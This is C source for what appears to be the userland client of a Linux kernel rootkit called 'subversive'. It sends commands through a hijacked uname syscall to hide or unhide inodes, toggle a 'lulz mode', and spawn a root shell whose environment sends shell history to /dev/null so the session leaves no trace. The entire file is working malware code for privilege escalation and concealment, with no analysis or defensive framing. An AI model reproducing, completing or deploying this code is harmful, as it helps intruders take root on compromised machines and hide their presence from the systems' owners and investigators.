#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <unistd.h>
#include <sys/syscall.h>

#include <subversive/subversive_ctl.h>

static struct option long_options[] = {
	{"hide-inode", 1, 0, 0},
	{"unhide-inode", 1, 0, 1},
	{"lulz-mode", 1, 0, 2},
	{"root-shell", 0, 0, 3},
	{0, 0, 0, 0}
};

void usage(const char *path)
{
	printf("%s [options]\n" \
		"\t--hide-inode <inode>\thide inode\n" \
		"\t--unhide-inode <inode>\tunhide inode\n" \
		"\t--lulz-mode <on|off>\tactivate lulz mode\n" \
		"\t--root-shell\t\tgive a root shell\n", path);
}

void root_shell(void)
{
	struct rk_args args;
	char *argv[] = { "/bin/sh", NULL };
	char *env[] = { "BASH_HISTORY=/dev/null", "HISTORY=/dev/null",
			"history=/dev/null" };

	memset(&args, 0, sizeof(args));
	args.mode = GET_ROOT;
	syscall(SYS_uname, &args);
	execve(argv[0], argv, env);
}

int main(int argc, char **argv)
{
	int c, opt_idx;
	struct rk_args args;

	for (;;) {
		memset(&args, 0, sizeof(args));
		c = getopt_long(argc, argv, "h", long_options, &opt_idx);
		if (c == -1)
			break;

		switch (c) {
		case 'h':
			usage(argv[0]);
			return 0;
		case 0:
			args.mode = HIDE_INODE;
			args.param1 = atoi(optarg);
			syscall(SYS_uname, &args);
			break;
		case 1:
			args.mode = UNHIDE_INODE;
			args.param1 = atoi(optarg);
			syscall(SYS_uname, &args);
			break;
		case 2:
			args.mode = LULZ_MODE;
			if (!strcmp(optarg, "on")) {
				args.param1 = 1;
			} else if (!strcmp(optarg, "off")) {
				args.param1 = 0;
			} else {
				usage(argv[0]);
				return 1;
			}

			syscall(SYS_uname, &args);
			break;
		case 3:
			root_shell();
			break;
		default:
			break;
		}
	}


	return 0;
}
